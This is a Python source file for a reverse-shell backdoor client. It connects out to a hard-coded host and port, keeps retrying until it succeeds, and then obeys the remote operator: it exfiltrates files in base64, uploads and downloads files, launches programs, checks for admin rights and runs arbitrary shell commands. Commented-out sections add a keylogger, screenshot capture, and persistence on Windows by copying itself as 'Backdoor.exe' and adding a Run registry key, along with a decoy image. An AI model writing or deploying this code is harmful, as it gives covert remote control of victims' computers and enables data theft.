#!/usr/bin/python
import socket
#import pynput
#import threading
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests
import platform

#import ctypes
#from mss import mss

#def process_keys(key):
##       global keys
#        try:
#                keys =  keys + str(key.char)
#        except AttributeError:
#                if key == key.space:
#                        keys = keys + " "
#                elif key == key.shift:
 #                       keys = keys + ""
  #              elif key == key.enter:
   #                     keys = keys + "<]"
    #            elif key == key.right:
     #                   keys = keys + ""
      #          elif key == key.left:
       #                 keys = keys + ""
        #        elif key == key.up:
         #               keys = keys + ""
          #      elif key == key.down:
           #             keys = keys + ""
            #    else:
#                        keys = keys + " " + str(key) + " "
 #       except UnicodeEncodeError:
  #              keys = keys + " " + str(key)

#def report():
#	 global keys
#        global keylogger_path
#        fin = open(keylogger_path, "a")
#        fin.write(keys)
#        keys = ""
#        fin.close()
#        timer = threading.Timer(5,report)
#        timer.start()


#def start_keylogger():
#        keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
#        with keyboard_listener:
#                report()
#                keyboard_listener.join()


def reliable_send(data):
        json_data = json.dumps(data)
        socket_client.send(json_data)

def reliable_recv():
        json_data = ""
        while True:
                try:
                        json_data = json_data + socket_client.recv(1024)
                        return json.loads(json_data)
                except ValueError:
                        continue
#def screenshot():
#	with mss() as screenshot:
#		screenshot.shot()

def is_admin():
	global admin
	if platform.system() == "Linux":
		if os.access('/root', os.R_OK) == True:
			admin = "Admin privileges"
		else:
			admin = "User Privileges"
	else:
		try:
			temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
		except:
			admin = "User privileges"
		else:
			admin = "Admin privileges"

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

def create_socket():
	#global variable
	global socket_client
	#creating the socket
	socket_client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def connection_open():
	#connect the socket (same adress as the server socket)
	global exit
	while True:
		time.sleep(5)
		try:
			socket_client.connect(("192.168.1.246", 54321))
			commands()
			if exit == True:
				break
		except:
			#retry connection
			connection_open()

def commands():
	#receive messages from the server and answer to theses messges
	global exit
	while True:
		command = reliable_recv()
		#print("The command of the server : %s" %command)
		if command == "exit":
			exit = True
			#try:
			#	print(keylogger_path)
			#	os.remove(keylogger_path)
			#except:
			#	continue
			#break
			return 0
		#command for change directory
		elif command == "help":
			help_options = '''                                          download <path> -> Download a file From target pc
					  upload <path>   -> Upload a file to target pc
					  get <url>       -> Download file to target pc from any website
					  start <path>    -> Start a program on target pc
					  keylogger start -> start the keylogger !!Doesn'work!!
					  keylogger dump  -> view the result of the keylogger !!Doesn't work!!
					  screenshot	  -> screenshot of the target monitor !!Does'nt work!!
					  check           -> Check for admin privileges
					  exit		  -> exit the reverse_shell'''
			reliable_send(help_options)
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:8] == "download":
			with open(command[9:], "rb") as file:
				reliable_send(base64.b64encode(file.read()))
		elif command[:6] == "upload":
			with open(command[7:],"wb") as fin:
				result = reliable_recv()
				fin.write(base64.b64decode(result))
		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("[+Success+] Downloaded file from specified URL")
			except:
				reliable_send("[!Failure!] Can't download the file")
		elif command[:5] == "start":
                        try:
                                subprocess.Popen(command[6:], shell=True)
                                reliable_send("[+Sucess+] Program started")
                        except:
                                reliable_send("[!Failure!] Can't start the program")
		#elif command[:10] == "screenshot":
		#	try:
		#		screenshot()
		#		with open("monitor-1.png", "rb") as sc:
		#			reliable_send(base64.b64encode(sc.read()))
		#		os.remove("monitor-1.png")
		#	except:
		#		reliable_send("[!Failure!] Can't take a screenshot")
		elif command[:5] == "check":
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("[!Failure!] Can't perform the check")
		#elif command[:15] == "keylogger start":
		#	t1 = threading.Thread(target=keylogger.start)
		#	t1.start()
		#elif command[:14] == "keylogger dump":
		#	fn = open(keylogger_path, "r")
		#	reliable_send(fn.read())
		else:
			try:
				process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				answer = process.stdout.read() + process.stderr.read()
				reliable_send(answer)
			except:
				reliable_send("[!Failure!] Can't execute this command")

def connection_close():
	print("Closing connection to the server")
	socket_client.close()

#if platform.system() == "Linux":
#	keylogger_path = ".keylogger.txt"
#	keys = ""
#else:
	#keylogger_path = os.environ["appdata"] + "\\keylogger.txt"
	#keys = ""
	#copying the file in a hidden directory
	#location = os.environ["appdata"] + "\\Backdoor.exe"
	#if not os.path.exists(location):
	#	shutil.copyfile(sys.executable, location)
	#	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location +'"', shell=True)
	#	name = sys._MEIPASS + "\anonymous.jpg"
	#	try:
	#		subprocess.Popen(name, shell=True)
	#	except:
	#		number1 = 1
	#		number2 =2
	#		number3 = number1 + number 2

exit = False
create_socket()
connection_open()
connection_close()
